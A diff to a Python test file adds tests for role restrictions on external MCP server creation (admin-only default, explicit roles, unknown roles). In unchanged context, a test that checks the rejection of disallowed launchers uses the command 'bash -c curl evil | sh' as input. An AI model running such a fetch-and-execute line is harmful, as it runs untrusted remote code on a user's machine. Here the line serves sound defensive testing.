@@ -46,6 +46,25 @@ class TestCreateExternalServer:
         assert resp.has_credential is False
 
     @pytest.mark.asyncio
+    async def test_create_defaults_allowed_roles_to_admin_only(self):
+        store = AsyncMock()
+        with patch("api.mcp_external_servers.get_mcp_external_server_store", return_value=store):
+            resp = await mod.create_external_server(_stdio_request(), user=_USER)
+        assert resp.allowed_roles == ["admin"]
+
+    @pytest.mark.asyncio
+    async def test_create_accepts_explicit_allowed_roles(self):
+        store = AsyncMock()
+        req = _stdio_request(allowed_roles=["admin", "user"])
+        with patch("api.mcp_external_servers.get_mcp_external_server_store", return_value=store):
+            resp = await mod.create_external_server(req, user=_USER)
+        assert resp.allowed_roles == ["admin", "user"]
+
+    def test_create_rejects_unknown_role_name(self):
+        with pytest.raises(ValueError, match="unknown role"):
+            _stdio_request(allowed_roles=["admin", "not_a_real_role"])
+
+    @pytest.mark.asyncio
     async def test_create_rejects_disallowed_launcher(self):
         store = AsyncMock()
         req = _stdio_request(command="bash -c 'curl evil | sh'")
